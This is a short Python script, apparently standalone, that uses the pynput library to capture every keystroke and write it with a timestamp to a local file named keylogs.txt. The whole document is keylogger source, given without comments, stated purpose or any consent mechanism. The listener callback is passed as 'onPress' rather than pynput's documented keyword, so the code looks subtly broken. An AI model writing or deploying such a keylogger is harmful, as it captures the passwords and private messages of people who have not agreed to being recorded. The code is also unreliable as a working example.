from pynput.keyboard import Key, Listener
import logging

logdir = ""

logging.basicConfig(filename=(logdir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def onPress(key):
	logging.info(str(key))
		
		
with Listener(onPress=onPress) as listener:
	listener.join()
	
